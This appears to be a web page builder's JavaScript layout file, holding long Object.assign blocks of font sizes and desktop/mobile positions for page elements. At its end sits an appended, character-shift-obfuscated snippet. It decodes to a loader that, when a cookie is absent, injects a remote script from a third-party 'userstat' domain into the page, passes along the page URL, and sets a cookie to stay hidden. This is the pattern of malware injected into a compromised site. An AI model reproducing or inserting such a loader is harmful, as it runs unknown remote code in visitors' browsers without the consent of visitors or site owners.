    e_487218_1_170802057965ce536358dea091232323: {
        fs: "13.9868",
        lh: "2"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536358dea091232323: {
        desktop: 454.764,
        mobile: 427.031
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536358ef6429736516: {
        fs: "20",
        lh: "1.6"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536358ef6429736516: {
        desktop: 373.489,
        mobile: 344.516
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536358f8c339795139: {
        fs: "26.2252",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536358f8c339795139: {
        desktop: 407.096,
        mobile: 376.516
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536359007431730549: {
        fs: "13.9868",
        lh: "2"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536359007431730549: {
        desktop: 473.166,
        mobile: 678.75
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536359172753317028: {
        fs: "13.9868",
        lh: "1.3"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536359172753317028: {
        desktop: 633.926,
        mobile: 824.344
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536359268169921729: {
        fs: "16",
        lh: "2"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536359268169921729: {
        desktop: 240.562,
        mobile: 206.288
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce5363592f9406496462: {
        fs: "31",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce5363592f9406496462: {
        desktop: 97.2984,
        mobile: 71
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536359386403627562: {
        fs: "61",
        lh: "1"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536359386403627562: {
        desktop: 7,
        mobile: 10
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536359430163239778: {
        fs: "52",
        lh: "1"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536359430163239778: {
        desktop: 786.6,
        mobile: 1340.97
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce5363594dd759413501: {
        desktop: 323.06,
        mobile: 334.094
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170819482538427867: {
        fs: "13",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170819482538427867: {
        desktop: 814.149,
        mobile: 1341.59
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170819510833997784: {
        desktop: 816.497,
        mobile: 1334.71
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_82127: {
        fs: "12",
        lh: "2"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_82127: {
        desktop: 544.5,
        mobile: 571.062
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_35627: {
        desktop: 356.754,
        mobile: 898.625
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_16466: {
        fs: "13.9868",
        lh: "2"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_16466: {
        desktop: 454.764,
        mobile: 993.162
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_60843: {
        fs: "20",
        lh: "1.6"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_60843: {
        desktop: 372.907,
        mobile: 910.647
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_41438: {
        fs: "26.2252",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_41438: {
        desktop: 406.49,
        mobile: 946.256
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_58239: {
        fs: "13.9868",
        lh: "2"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_58239: {
        desktop: 563.926,
        mobile: 1105.08
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_72095: {
        fs: "13.9868",
        lh: "1.3"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_72095: {
        desktop: 703.926,
        mobile: 1272.95
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce536359747092447572: {
        fs: "30",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce536359747092447572: {
        desktop: 40,
        mobile: 16.0625
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802177593416702: {
        fs: "15",
        lh: ""
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802177593416702: {
        desktop: 115,
        mobile: 72.883
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170819954674737482: {
        desktop: 515.812,
        mobile: 571.75
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170819967979337291: {
        fs: "48",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170819967979337291: {
        desktop: 542.031,
        mobile: 811.75
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_21573_d: {
        desktop: 525.109,
        mobile: 253.125
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170819982509465152: {
        fs: "18",
        lh: "1.3"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170819982509465152: {
        desktop: 539.562,
        mobile: 1171.75
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170820119675397401_m: {
        desktop: 30.953,
        mobile: 518.219
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170820127887509458_m: {
        fs: "15",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170820127887509458_m: {
        desktop: 250.953,
        mobile: 530.219
    }
}), blocos_posicao = Object.assign(blocos_posicao, {
    b_487218_1_170802057965ce5363575cb: {
        desktop: 555.047,
        mobile: 562.75
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170802057965ce53635a869583605961: {
        fs: "9",
        lh: "2"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170802057965ce53635a869583605961: {
        desktop: 233.781,
        mobile: 372.766
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_22806: {
        desktop: 110.828,
        mobile: 61.3906
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170819429246049632: {
        desktop: 120.516,
        mobile: 264.844
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170819470053575765: {
        fs: "10",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170819470053575765: {
        desktop: 157.312,
        mobile: 95.9219
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170819538889655192: {
        fs: "11.1874",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170819538889655192: {
        desktop: 95,
        mobile: 154.274
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_56982: {
        fs: "11.1874",
        lh: "1.400003575451"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_56982: {
        desktop: 120.141,
        mobile: 171.963
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_33522: {
        fs: "11.1874",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_33522: {
        desktop: 148.844,
        mobile: 195.356
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_11317: {
        fs: "11.1874",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_11317: {
        desktop: 173.062,
        mobile: 218.749
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_35582: {
        fs: "11.1874",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_35582: {
        desktop: 120.156,
        mobile: 171.963
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170819606776577929: {
        desktop: 120.516,
        mobile: 263.844
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_84434: {
        fs: "11",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_84434: {
        desktop: 95,
        mobile: 242.688
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_08515: {
        fs: "11",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_08515: {
        desktop: 95,
        mobile: 267.797
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_32218: {
        fs: "11",
        lh: "1"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_32218: {
        desktop: 125.203,
        mobile: 291.719
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_02918: {
        fs: "11.1874",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_02918: {
        desktop: 95,
        mobile: 154.274
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_85046: {
        fs: "11.1874",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_85046: {
        desktop: 148.109,
        mobile: 194.122
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170819973254876262: {
        fs: "16",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170819973254876262: {
        desktop: 29.1087,
        mobile: 991.75
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_21573_m: {
        desktop: 525.109,
        mobile: 253.125
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170820119675397401_d: {
        desktop: 30.953,
        mobile: 518.219
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170820127887509458_d: {
        fs: "15",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170820127887509458_d: {
        desktop: 250.953,
        mobile: 530.219
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_170820132137497125: {
        fs: "12",
        lh: "1.4"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_170820132137497125: {
        desktop: 1048.41,
        mobile: -6
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_23264: {
        desktop: 139.5,
        mobile: .453125
    }
}), elementos_css = Object.assign(elementos_css, {
    e_487218_1_04622: {
        fs: "11.1874",
        lh: "1.400003575451"
    }
}), elementos_posicao = Object.assign(elementos_posicao, {
    e_487218_1_04622: {
        desktop: 198.312,
        mobile: 242.555
    }
});
var scripts_estatisticas = {},
    scripts_marketing = {};
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));
